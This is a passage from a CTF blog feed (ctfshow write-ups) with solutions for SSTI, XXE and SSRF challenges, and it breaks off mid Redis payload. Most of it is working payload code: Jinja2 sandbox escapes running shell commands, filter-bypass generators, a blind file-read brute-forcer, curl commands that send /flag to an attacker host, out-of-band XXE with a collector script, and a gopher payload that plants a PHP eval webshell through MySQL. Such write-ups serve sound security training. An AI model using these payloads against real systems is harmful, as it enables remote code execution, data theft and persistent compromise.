22257605320525584078180889073523223973924192984353847137164605186956629675938929585386392327672065524338176402496414014083816446508860530887742583338880317478862512306633061601510404960095143941320847160562050524072860211772522478494742213643890027443992183362678970426046765630946644339093149139143388752794932806956589884503569175226850419271095336798456238899009883100793515744579945854481430194879360765346236418019384644095257242811629393164402498261066077339304875212250897918420427814000142751282805980632089867108525335488018940091698609890995252413007073725850396076272027183422297684667565712022199054289711\nc2 = 2742600695441836559469553702831098375948641915409106976157840377978123912007398753623461112659796209918866985480471911393362797753624479537646802510420415039461832118018849030580675249817576926858363541683135777239322002741820145944286109172066259843766755795255913189902403644721138554935991439893850589677849639263080528599197595705927535430942463184891689410078059090474682694886420022230657661157993875931600932763824618773420077273617106297660195179922018875399174346863404710420166497017196424586116535915712965147141775026549870636328195690774259990189286665844641289108474834973710730426105047318959307995062\n\n\np = gmpy2.gcd(n1,n2)\nq1 = n1//p\nd = gmpy2.invert(e,(p-1)*(q1-1))\nprint(long_to_bytes(pow(c1,d,n1)))\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/47d18edd/",
            "url": "http://dpm12345.cn/posts/47d18edd/",
            "title": "SSTI",
            "date_published": "2023-03-31T03:12:40.000Z",
            "content_html": "<h1 id=\"web-361\"><a href=\"#web-361\" class=\"headerlink\" title=\"web 361\"></a>web 361</h1><p>提示考点在名字</p>\n<p>尝试<code>?name={{4+4}}</code>，返回出错，确认为注入点</p>\n<p>于是<code>?name={{''.__class__.__mro__[1].__subclasses__()}}</code></p>\n<p>找到</p>\n<p><code>&lt;class 'os._wrap_close'&gt;</code></p>\n<p>然后</p>\n<p><code>?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('ls').read()}}</code></p>\n<p>得到 app.py</p>\n<p><code>?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('ls /').read()}}</code></p>\n<p>得到 app bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</p>\n<p><code>?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}</code></p>\n<p>得到flag</p>\n<p>或者<code>?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('ls').read()}}</code></p>\n<h1 id=\"web-362\"><a href=\"#web-362\" class=\"headerlink\" title=\"web 362\"></a>web 362</h1><p>进行了过滤，但不清楚过滤啥</p>\n<p>只能发现上面os的不能选择，于是选择407的<code>&lt;class 'subprocess.Popen'&gt;</code></p>\n<p><code>?name={{''.__class__.__mro__[1].__subclasses__()[407].__init__.__globals__['popen']('ls').read()}}</code>则不行</p>\n<p>payload:<code>?name={{''.__class__.__mro__[1].__subclasses__()[407].__init__.__globals__['__builtins__'].eval('__import__(\"os\").popen(\"cat /flag\").read()')}}</code></p>\n<h1 id=\"web-363\"><a href=\"#web-363\" class=\"headerlink\" title=\"web 363\"></a>web 363</h1><p><code>?name={{()[request.args.a].__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.b].eval(request.args.c)}}&amp;a=__class__&amp;b=__builtins__&amp;c=__import__(\"os\").popen(\"cat /flag\").read()</code></p>\n<h1 id=\"web-364\"><a href=\"#web-364\" class=\"headerlink\" title=\"web 364\"></a>web 364</h1><p>cookies绕过</p>\n<p><code>?name={{x.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.cookies.b].eval(request.cookies.c)}}</code></p>\n<p><code>b=__builtins__</code></p>\n<p><code>c=__import__(\"os\").popen(\"cat /flag\").read()</code></p>\n<p>或者<code>?name={{x.__init__.__globals__.__getitem__(request.cookies.b).eval(request.cookies.c)}}</code></p>\n<h1 id=\"web-365\"><a href=\"#web-365\" class=\"headerlink\" title=\"web 365\"></a>web 365</h1><p>同上一题</p>\n<h1 id=\"web-366\"><a href=\"#web-366\" class=\"headerlink\" title=\"web 366\"></a>web 366</h1><p>上面的几乎都过滤了，下划线也过滤了，而attr用于获取变量</p>\n<pre><code class=\"raw\">\"\"|attr(\"__class__\")\n相当于\n\"\".__class__\n</code></pre>\n<p>故<code>?name={{(x|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c))(request.cookies.d).eval(request.cookies.e)}}</code></p>\n<pre><code class=\"raw\">a=__init__\nb=__globals__\nc=__getitem__\nd=__builtins__\ne=__import__('os').popen('cat /flag').read()\n</code></pre>\n<h1 id=\"web-367\"><a href=\"#web-367\" class=\"headerlink\" title=\"web 367\"></a>web 367</h1><p>同web 366</p>\n<h1 id=\"web-368\"><a href=\"#web-368\" class=\"headerlink\" title=\"web 368\"></a>web 368</h1><p><code>{{`被过滤,使用`{%%}`绕过,再借助`print()`回显\n\n故`?name={%print((x|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c))(request.cookies.d).eval(request.cookies.e))%}`\n\n```raw\na=__init__\nb=__globals__\nc=__getitem__\nd=__builtins__\ne=__import__('os').popen('cat /flag').read()\n```\n\n# web 369\n\n过滤了request，这就需要自己来凑字符串\n\n## 解法一\n\n这里拿config来凑。一般我们想到的是使用`__str__()`，但是一个问题是`_`被ban了，所以`__str__()`用不了；这里拿string过滤器来得到config的字符串：`config|string`，但是获得字符串后本来应该用中括号或者`__getitem__()`，但是问题是`_`和`[` `]`被ban了，所以获取字符串中的某个字符比较困难。这里转换成列表，再用列表的pop方法就可以成功得到某个字符了，在跑字符的时候发现没有小写的b，只有大写的B，所以再去一层`lower()`方法，方便跑更多字符\n\n这里用的是`{{lipsum.__globals__['os'].popen('cat /flag').read()}}</code></p>\n<pre><code class=\"python\">'''\nAuthor       : dpm12345 1006975692@qq.com\nGithub       : https://github.com/dpm12345\nDate         : 2023-04-09 09:39:23\nLastEditors  : dpm12345 1006975692@qq.com\nLastEditTime : 2023-04-09 11:33:12\nDescription  : \n'''\n\n\nimport requests\nurl=\"http://26e2b843-cdf9-4c43-8946-f748dd29eb7f.challenge.ctf.show/?name={{% print (config|string|list).pop({}).lower() %}}\"\n \npayload=[\"__globals__\",\"os\",\"cat /flag\"]\ndef get_res(payload_list):\n    dic = {}\n    result= []\n    for payload in payload_list:\n        tmp_res = \"\"\n        for j in payload:\n            try:\n                print(\"(config|string|list).pop(%d).lower()  ==  %s\"%(dic[j],j))\n                tmp_res+=\"(config|string|list).pop(%d).lower()~\"%(dic[j])\n            except:\n                for i in range(0,1000):\n                    r=requests.get(url=url.format(i))\n                    location=r.text.find(\"&lt;h3&gt;\")\n                    word=r.text[location+4:location+5]\n                    if word==j.lower():\n                        print(\"(config|string|list).pop(%d).lower()  ==  %s\"%(i,j))\n                        tmp_res+=\"(config|string|list).pop(%d).lower()~\"%(i)\n                        dic[j] = i\n                        break\n        result.append(tmp_res[:len(tmp_res)-1])\n    return result\n\nprint(get_res(payload))\n\n# \"?name={% print (lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read() %}\"\n</code></pre>\n<p>或者也可构造前面使用过的，如<code>?name={{x.__init__.__globals__.__getitem__[\"__builtins__\"].eval(\"__import__('os').popen('cat /flag').read()\")}}</code></p>\n<p>但要注意的是，使用<code>|attr</code>进行连接时，后面要带上参数时,需将前面一块用括号括起，如要获取到<code>builtins</code>的内容，<code>(x|attr('__init__')|attr('__globals__')|attr('__getitem__'))('__builtins__')</code></p>\n<p>如果是使用前面的，这里试验了以下，也是可以的</p>\n<pre><code class=\"raw\">?name={% print (((x|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(3).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(157).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()))((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(21).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(3).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()).eval((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(157).lower()~(config|string|list).pop(17).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(18).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower())|attr((config|string|list).pop(17).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(17).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(3).lower()))((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower())|attr((config|string|list).pop(18).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(20).lower()))()\n```\n\n## 解法二\n\n```raw\nGET:?name=\n{% set po=dict(po=a,p=a)|join%}\n{% set a=(()|select|string|list)|attr(po)(24)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}\n{%print(x.open(file).read())%}\n</code></pre>\n<p>原理是</p>\n<pre><code class=\"raw\">{% set a=dict(o=oo,s=ss)|join %}\n</code></pre>\n<p>这样得到的a就是把这个字典的键名拼接后的值，即os，这样的拼接不需要用到单双引号，非常方便。至于要做的，就是想办法把类似<code>_</code>这样的字符通过一系列操作找出来就可以了</p>\n<p>如何得到_?</p>\n<pre><code class=\"raw\">{% set a=(()|select|string|list)|attr(po)(24)%}\n</code></pre>\n<p>此时a=_</p>\n<h2 id=\"解法三\"><a href=\"#解法三\" class=\"headerlink\" title=\"解法三\"></a>解法三</h2><p>读文件盲注</p>\n<pre><code class=\"python\">import requests\nimport string\ndef ccchr(s):\n    t=''\n    for i in range(len(s)):\n        if i&lt;len(s)-1:\n            t+='chr('+str(ord(s[i]))+')%2b'\n        else:\n            t+='chr('+str(ord(s[i]))+')'\n    return t\nurl ='''http://b134fd30-bddc-4302-8578-8005b96f73c2.chall.ctf.show/?name=\n{% set a=(()|select|string|list).pop(24)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set cmd=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}\n{% set cmd2='''\n \ns=string.digits+string.ascii_lowercase+'{_-}'\nflag=''\nfor i in range(1,50):\n\tprint(i)\n\tfor j in s:\n\t\tx=flag+j\n\t\tu=url+ccchr(x)+'%}'+'{% if x.open(cmd).read('+str(i)+')==cmd2%}'+'1341'+'{% endif%}'\n        #print(u)\n        r=requests.get(u)\n        if(\"1341\" in r.text):\t\t\t\n            flag=x\n            print(flag)\n            break\n</code></pre>\n<h2 id=\"解法四\"><a href=\"#解法四\" class=\"headerlink\" title=\"解法四\"></a>解法四</h2><p>反弹shell，监听 nc -lvp 4567</p>\n<pre><code class=\"python\">http://da9612ac-2b66-485d-8149-b76a1f03d22c.chall.ctf.show/?name=\n{% set a=(()|select|string|list).pop(24)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set cmd=\n%}\n{%if x.eval(cmd)%}\n123\n{%endif%}\n \n//cmd的值用这个脚本生成\ns='__import__(\"os\").popen(\"curl http://xxx:4567?p=`cat /flag`\").read()'\ndef ccchr(s):\n    t=''\n    for i in range(len(s)):\n        if i&lt;len(s)-1:\n            t+='chr('+str(ord(s[i]))+')%2b'\n        else:\n            t+='chr('+str(ord(s[i]))+')'\n    return t\n</code></pre>\n<h1 id=\"web-370\"><a href=\"#web-370\" class=\"headerlink\" title=\"web 370\"></a>web 370</h1><p>经测试，相比之前又过滤掉了数字</p>\n<p>获取数字的话有两个方法</p>\n<h2 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2><p><code>index()</code></p>\n<p>用来获取索引值</p>\n<h2 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2><p><code>length()/count()</code></p>\n<p>用来获取长度值(注意<code>%2b</code>防止<code>+</code>被解析为空格)<br>$$<br>24 = (2^2)^2 + 2 ^ 3\\<br>47 = (2^2)^2 * 3 - 1\\<br>102 = ((2^2)^2+1) * 2 * 3\\<br>108 = ((2^2)^2+2) * 2 * 3\\<br>97 = ((2^2)^2) * 2 * 3\\<br>103 = ((2^2)^2+1) * 2 * 3 + 1<br>$$</p>\n<pre><code class=\"raw\">?name=\n{% set po=dict(po=a,p=a)|join%}\n{% set one = (dict(a=a)|join|length) %}\n{% set two = (dict(aa=a)|join|length) %}\n{% set three = (dict(aaa=a)|join|length) %}\n{% set a=(()|select|string|list)|attr(po)(two**two**two%2btwo**three) %}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set file=chr(three*(two**two**two)-one)%2bchr(two*three*(two**two**two%2bone))%2bchr(two*three*(two**two**two%2btwo))%2bchr(two*three*(two**two**two)%2bone)%2bchr(two*three*(two**two**two%2bone)%2bone)%}\n{% print(x.open(file).read()) %}\n</code></pre>\n<h1 id=\"web-371\"><a href=\"#web-371\" class=\"headerlink\" title=\"web 371\"></a>web 371</h1><p>ban掉了print，这里使用反弹shell</p>\n<pre><code class=\"raw\">?name=\n{% set c=(t|count)%}\n{% set cc=(dict(e=a)|join|count)%}\n{% set ccc=(dict(ee=a)|join|count)%}\n{% set cccc=(dict(eee=a)|join|count)%}\n{% set ccccc=(dict(eeee=a)|join|count)%}\n{% set cccccc=(dict(eeeee=a)|join|count)%}\n{% set ccccccc=(dict(eeeeee=a)|join|count)%}\n{% set cccccccc=(dict(eeeeeee=a)|join|count)%}\n{% set ccccccccc=(dict(eeeeeeee=a)|join|count)%}\n{% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%}\n{% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%}\n{% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%}\n{% set coun=(ccc~ccccc)|int%}\n{% set po=dict(po=a,p=a)|join%}\n{% set a=(()|select|string|list)|attr(po)(coun)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set cmd=\n%}\n{%if x.eval(cmd)%}\nabc\n{%endif%}\n</code></pre>\n<p><code>cmd</code>的内容用以下python脚本跑出</p>\n<pre><code class=\"python\">def aaa(t):\n    t='('+(int(t[:-1:])+1)*'c'+'~'+(int(t[-1])+1)*'c'+')|int'\n    return t\nip = \"\"\nport = 56414\ns=f'__import__(\"os\").popen(\"curl {ip}:{port}?p=`cat /flag`\").read()'\ndef ccchr(s):\n    t=''\n    for i in range(len(s)):\n        if i&lt;len(s)-1:\n            t+='chr('+aaa(str(ord(s[i])))+')%2b'\n        else:\n            t+='chr('+aaa(str(ord(s[i])))+')'\n    return t\nprint(ccchr(s))\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/524679b/",
            "url": "http://dpm12345.cn/posts/524679b/",
            "title": "2023年CTF",
            "date_published": "2023-03-20T13:12:40.000Z",
            "content_html": "<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"除夕\"><a href=\"#除夕\" class=\"headerlink\" title=\"除夕\"></a>除夕</h2><p>考察得是PHP得若等于，这里可以用科学计数法</p>\n<p><code>?year=202.2e1</code></p>\n<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h2 id=\"初二\"><a href=\"#初二\" class=\"headerlink\" title=\"初二\"></a>初二</h2><h2 id=\"初四\"><a href=\"#初四\" class=\"headerlink\" title=\"初四\"></a>初四</h2>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/e93ac459/",
            "url": "http://dpm12345.cn/posts/e93ac459/",
            "title": "XXE",
            "date_published": "2023-03-20T12:15:40.000Z",
            "content_html": "<h1 id=\"web-373\"><a href=\"#web-373\" class=\"headerlink\" title=\"web 373\"></a>web 373</h1><p>burp进行提交，hackbar影响上传</p>\n<pre><code class=\"xml\">&lt;!DOCTYPE test [\n&lt;!ENTITY xxe SYSTEM \"file:///flag\"&gt;\n]&gt;\n&lt;zhong&gt;\n&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;\n&lt;/zhong&gt;\n</code></pre>\n<h1 id=\"web374-376\"><a href=\"#web374-376\" class=\"headerlink\" title=\"web374~376\"></a>web374~376</h1><p>可以引用外部实体，在服务器写以下文件</p>\n<p>exp.php</p>\n<pre><code class=\"php\">&lt;?php\n$content = $_GET['1'];\nif(isset($content)){\n    file_put_contents('flag.txt',\"flag如下\\n\".$content);\n}else{\n    echo 'no data input';\n}\n</code></pre>\n<p>xxe.xml</p>\n<pre><code class=\"xml\">&lt;!ENTITY % all\n\"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://xxx.xxx.xxx.xxx/exp.php?1=%file;'\"\n&gt;\n%all;\n</code></pre>\n<p>payload为</p>\n<pre><code class=\"xml\">&lt;!DOCTYPE ANY[\n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\"&gt;\n&lt;!ENTITY % remote SYSTEM \"http://xxx.xxx.xxx.xxx/xxe.xml\"&gt;\n%remote;\n%send;\n]&gt;\n</code></pre>\n<p>得到flag</p>\n<h1 id=\"web-377\"><a href=\"#web-377\" class=\"headerlink\" title=\"web 377\"></a>web 377</h1><p><code>if(preg_match('/&lt;\\?xml version=\"1\\.0\"|http/i', $xmlfile))</code></p>\n<p>增加了对<code>http</code>的过滤</p>\n<p>利用 utf-16 编码</p>\n<pre><code class=\"python\">a ='''\n&lt;!DOCTYPE ANY[\n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\"&gt;\n&lt;!ENTITY % remote SYSTEM \"http://xxx.xxx.xxx.xxx/xxe.xml\"&gt;\n%remote;\n%send;\n]&gt;'''\nimport requests\n\n\ndata = a.encode('utf-16')\n\nurl = 'http://129c32f8-755b-4686-ad48-257a0011c8aa.challenge.ctf.show/'\n\nrequests.post(url=url,data=data)\n</code></pre>\n<h1 id=\"web-378\"><a href=\"#web-378\" class=\"headerlink\" title=\"web 378\"></a>web 378</h1><p>抓包，可以发现用户，密码用<code>XML</code>形式发送</p>\n<p>可以直接回显</p>\n<pre><code class=\"xml\">&lt;!DOCTYPE ANY[\n&lt;!ENTITY file SYSTEM \"file:///flag\"&gt;\n]&gt;\n&lt;user&gt;\n&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/fe1aa8c3/",
            "url": "http://dpm12345.cn/posts/fe1aa8c3/",
            "title": "XSS",
            "date_published": "2023-03-20T12:15:40.000Z",
            "content_html": "<h1 id=\"web-316\"><a href=\"#web-316\" class=\"headerlink\" title=\"web 316\"></a>web 316</h1>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/813434ca/",
            "url": "http://dpm12345.cn/posts/813434ca/",
            "title": "SSRF",
            "date_published": "2023-03-16T14:12:40.000Z",
            "content_html": "<h1 id=\"web-351\"><a href=\"#web-351\" class=\"headerlink\" title=\"web 351\"></a>web 351</h1><p>网页目录下有flag.php，访问后返回非本地用户无法访问</p>\n<p>于是post参数url <code>url=http://127.0.0.1/flag.php</code></p>\n<p>得到flag</p>\n<h1 id=\"web-352\"><a href=\"#web-352\" class=\"headerlink\" title=\"web 352\"></a>web 352</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\nif(!preg_match('/localhost|127.0.0/')){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?&gt; \n</code></pre>\n<p>限定”http”/“https”，且过滤了<code>127.0.0</code>和<code>localhost</code>，这涉及到<code>127.0.0.1</code>的他种写法</p>\n<p>有很多如<code>0</code>，<code>127.1</code>,<code>127.0.1</code>,`</p>\n<p>或者进制转换</p>\n<p>或者写个重定向的网页</p>\n<h1 id=\"web-353\"><a href=\"#web-353\" class=\"headerlink\" title=\"web 353\"></a>web 353</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\nif(!preg_match('/localhost|127\\.0\\.|\\。/i', $url)){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?&gt;\n</code></pre>\n<p>同上题,使用<code>127.1</code>,<code>0</code>等</p>\n<h1 id=\"web-354\"><a href=\"#web-354\" class=\"headerlink\" title=\"web 354\"></a>web 354</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\nif(!preg_match('/localhost|1|0|。/i', $url)){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?&gt;\n</code></pre>\n<p>不能出现<code>localhost</code>,<code>1</code>,<code>0</code>,<code>。</code>等字符</p>\n<p>故这里使用302跳转重定向或改本地域名的A记录到127.0.0.1上</p>\n<h1 id=\"web-355\"><a href=\"#web-355\" class=\"headerlink\" title=\"web 355\"></a>web 355</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\n$host=$x['host'];\nif((strlen($host)&lt;=5)){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?&gt;\n</code></pre>\n<p>要求长度小于5，那么可以使用<code>127.1</code>,<code>0</code></p>\n<h1 id=\"web-356\"><a href=\"#web-356\" class=\"headerlink\" title=\"web 356\"></a>web 356</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\n$host=$x['host'];\nif((strlen($host)&lt;=3)){\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n}\nelse{\n    die('hacker');\n}\n}\nelse{\n    die('hacker');\n}\n?&gt;\n</code></pre>\n<p>长度小于3.使用<code>0</code></p>\n<h1 id=\"web-357\"><a href=\"#web-357\" class=\"headerlink\" title=\"web 357\"></a>web 357</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif($x['scheme']==='http'||$x['scheme']==='https'){\n$ip = gethostbyname($x['host']);\necho '&lt;/br&gt;'.$ip.'&lt;/br&gt;';\nif(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {\n    die('ip!');\n}\n\n\necho file_get_contents($_POST['url']);\n}\nelse{\n    die('scheme');\n}\n?&gt;\n</code></pre>\n<p>302跳转</p>\n<h1 id=\"web-358\"><a href=\"#web-358\" class=\"headerlink\" title=\"web 358\"></a>web 358</h1><pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$x=parse_url($url);\nif(preg_match('/^http:\\/\\/ctf\\..*show$/i',$url)){\n    echo file_get_contents($url);\n}\n</code></pre>\n<p>payload:<code>http://ctf.@127.0.0.1/flag.php?show</code></p>\n<h1 id=\"web-359\"><a href=\"#web-359\" class=\"headerlink\" title=\"web 359\"></a>web 359</h1><p>利用</p>\n<pre><code class=\"raw\">Give MySQL username: root                                                                          \nGive query to execute: select \"&lt;?php eval($_POST[1]);?&gt;\" into outfile \"/var/www/html/1.php\"\n</code></pre>\n<p>得到</p>\n<pre><code class=\"raw\">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01\n</code></pre>\n<p>在<code>check.php</code>上post参数<code>returl=xxx</code>，其中下划线后面的要url编码，使网站目录下生成含一句话木马的<code>1.php</code></p>\n<h1 id=\"web-360\"><a href=\"#web-360\" class=\"headerlink\" title=\"web 360\"></a>web 360</h1><p>根据题目提示，打redis</p>\n<pre><code class=\"raw\">What do you want?? (ReverseShell/PHPShell): PHPShell\n\nGive web root location of server (default is /var/www/html):                                       \nGive PHP Payload (We have default PHP 